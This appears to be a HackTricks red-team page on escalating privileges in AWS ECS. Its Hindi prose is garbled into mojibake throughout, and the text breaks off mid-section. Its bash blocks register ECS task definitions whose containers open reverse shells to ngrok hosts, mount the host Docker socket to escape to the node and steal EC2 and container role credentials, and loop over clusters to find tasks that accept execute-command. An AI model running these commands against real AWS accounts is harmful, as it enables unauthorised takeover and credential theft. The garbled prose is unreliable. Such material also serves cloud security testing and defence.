# AWS - ECS ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡§æ‡§®‡§æ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>‡§ï‡•á ‡§∏‡§æ‡§• ‡§ú‡•Ä‡§∞‡•ã ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç</strong></a><strong>!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç**](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§≤‡•á‡§ï‡•ç‡§∂‡§®, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç** ‡§π‡•à‡§ï‡•ç‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§î‡§∞ ‡§π‡•à‡§ï‡•ç‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§ï‡•ç‡§≤‡§æ‡§â‡§° github ‡§∞‡•á‡§™‡•ã ‡§Æ‡•á‡§Ç PR ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á‡•§

</details>

## ECS

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ECS ‡§Æ‡•á‡§Ç `iam:PassRole`, `ecs:RegisterTaskDefinition` ‡§î‡§∞ `ecs:RunTask` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§ø‡§∂‡•á‡§∑‡§ú‡•ç‡§û ‡§è‡§ï **‡§®‡§è ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ** ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§π‡§æ‡§®‡§ø‡§ï‡§æ‡§∞‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§ö‡•Å‡§∞‡§æ ‡§≤‡•á‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§á‡§∏‡•á ‡§ö‡§≤‡§æ‡§§‡§æ ‡§π‡•à**‡•§
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§è‡§ï ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§Æ‡•á‡§Ç ‡§∏‡•Ä‡§ß‡§æ ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï‡•§

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ECS ‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§®‡§Ø‡§æ ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ** ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§π‡§æ‡§®‡§ø‡§ï‡§æ‡§∞‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§ö‡•Å‡§∞‡§æ ‡§≤‡•á‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§á‡§∏‡•á ‡§ö‡§≤‡§æ‡§§‡§æ ‡§π‡•à**‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç, ‡§è‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã ‡§ö‡§æ‡§≤‡•Ç ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡•ã ‡§ï‡§ø ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à‡•§
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•ã ‡§∏‡•Ä‡§ß‡§æ ‡§â‡§®‡•ç‡§®‡§§ ‡§¨‡§®‡§æ‡§®‡§æ‡•§

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ‡§Ø‡§æ **`ecs:CreateService`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ECS ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ **‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§π‡§æ‡§®‡§ø‡§ï‡§æ‡§∞‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§ö‡•Å‡§∞‡§æ ‡§≤‡•á‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§ï‡§Æ ‡§∏‡•á ‡§ï‡§Æ 1 ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§®‡§à ‡§∏‡•á‡§µ‡§æ ‡§¨‡§®‡§æ‡§ï‡§∞ ‡§á‡§∏‡•á ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§Æ‡•á‡§Ç ‡§∏‡•Ä‡§ß‡§æ ‡§â‡§®‡•ç‡§®‡§§‡§ø‡•§

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

‡§Ø‡§π ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø ‡§™‡§ø‡§õ‡§≤‡•á ‡§µ‡§æ‡§≤‡•ã‡§Ç ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® **`iam:PassRole`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡•á ‡§¨‡§ø‡§®‡§æ‡•§\
‡§Ø‡§π ‡§´‡§ø‡§∞ ‡§≠‡•Ä ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§∞‡•ã‡§≤ ‡§ï‡•á ‡§¨‡§ø‡§®‡§æ ‡§≠‡•Ä ‡§è‡§ï ‡§Ö‡§®‡§ø‡§Ø‡§Æ‡§ø‡§§ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ **‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡§æ‡§ï‡§ø ‡§®‡•ã‡§° ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§®‡§ø‡§ï‡§≤ ‡§∏‡§ï‡•á‡§Ç ‡§î‡§∞ **EC2 IAM ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ** ‡§î‡§∞ ‡§®‡•ã‡§° ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡•Ä **‡§Ö‡§®‡•ç‡§Ø ECS ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§è‡§Ç** ‡§ö‡•Å‡§∞‡§æ ‡§∏‡§ï‡•á‡§Ç‡•§\
‡§Ü‡§™ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ü‡§™ **‡§Ö‡§®‡•ç‡§Ø ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç EC2 ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è** ‡§ú‡§ø‡§®‡§ï‡•á ‡§™‡§∞‡§Æ‡§æ‡§£‡•Å (‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏) ‡§ö‡•Å‡§∞‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™‡§®‡•á ‡§â‡§®‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§ö‡§∞‡•ç‡§ö‡§æ ‡§ï‡•Ä ‡§π‡•à ([**‡§®‡•ã‡§° ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§§‡§ï**](aws-ecs-privesc.md#privesc-to-node))‡•§

{% hint style="warning" %}
‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§ï‡•á‡§µ‡§≤ ‡§§‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§Ö‡§ó‡§∞ **ECS ‡§ï‡•ç‡§≤‡§∏‡•ç‡§ü‡§∞ EC2** ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§î‡§∞ ‡§® ‡§ï‡§ø Fargate‡•§
{% endhint %}
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç **‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§∏‡§æ‡§• ‡§ú‡•Å‡§°‡§º‡•Ä IAM ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•ã ‡§¨‡§æ‡§π‡§∞ ‡§≤‡•á ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (‡§Ü‡§™‡§ï‡•ã ‡§µ‡§∞‡•ç‡§£‡§® ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø `aws ecs execute-command` ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à)‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏‡•á ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã **ExecuteCommand ‡§è‡§ú‡•á‡§Ç‡§ü** ‡§ö‡§≤ ‡§∞‡§π‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è (‡§ú‡•ã ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à)‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã ‡§Ø‡§π ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

* **‡§π‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡•á‡§Ç**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
* ‡§Ö‡§ó‡§∞ ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:RunTask`** ‡§π‡•à, ‡§§‡•ã `aws ecs run-task --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§ö‡§≤‡§æ‡§è‡§Ç‡•§
* ‡§Ö‡§ó‡§∞ ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:StartTask`** ‡§π‡•à, ‡§§‡•ã `aws ecs start-task --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§ö‡§≤‡§æ‡§è‡§Ç‡•§
* ‡§Ö‡§ó‡§∞ ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:CreateService`** ‡§π‡•à, ‡§§‡•ã `aws ecs create-service --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§¨‡§®‡§æ‡§è‡§Ç‡•§
* ‡§Ö‡§ó‡§∞ ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:UpdateService`** ‡§π‡•à, ‡§§‡•ã `aws ecs update-service --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

‡§Ü‡§™ **‡§™‡§ø‡§õ‡§≤‡•á ECS ‡§™‡•ç‡§∞‡§æ‡§á‡§µ‡•á‡§∏‡•ç‡§ï ‡§ñ‡§Ç‡§°‡•ã‡§Ç** ‡§Æ‡•á‡§Ç **‡§á‡§® ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™‡•ã‡§Ç ‡§ï‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£** ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ç‡§∏ ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á ‡§è‡§ï ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§æ‡§á‡§µ‡•á‡§∏‡•ç‡§ï‡•§

### `ssm:StartSession`

‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç **ssm ‡§™‡•ç‡§∞‡§æ‡§á‡§µ‡•á‡§∏‡•ç‡§ï ‡§™‡•á‡§ú** ‡§Æ‡•á‡§Ç ‡§ï‡•à‡§∏‡•á ‡§Ü‡§™ ‡§á‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á **ECS ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§æ‡§á‡§µ‡•á‡§∏‡•ç‡§ï** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

{% content-ref url="aws-ssm-privesc.md" %}
[aws-ssm-privesc.md](aws-ssm-privesc.md)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç **ec2 ‡§™‡•ç‡§∞‡§æ‡§á‡§µ‡•á‡§∏‡•ç‡§ï ‡§™‡•á‡§ú** ‡§Æ‡•á‡§Ç ‡§ï‡•à‡§∏‡•á ‡§Ü‡§™ ‡§á‡§® ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á **ECS ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§æ‡§á‡§µ‡•á‡§∏‡•ç‡§ï** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

{% content-ref url="aws-ec2-privesc.md" %}
[aws-ec2-privesc.md](aws-ec2-privesc.md)
{% endcontent-ref %}

### `?ecs:RegisterContainerInstance`

TODO: ‡§ï‡•ç‡§Ø‡§æ ‡§è‡§ï ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® AWS ‡§ñ‡§æ‡§§‡•á ‡§∏‡•á ‡§è‡§ï ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§Ö‡§ü‡•à‡§ï‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§Æ‡§∂‡•Ä‡§®‡•ã‡§Ç ‡§™‡§∞ ‡§ö‡§≤‡§æ‡§è ‡§ú‡§æ ‡§∏‡§ï‡•á‡§Ç??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

{% hint style="info" %}
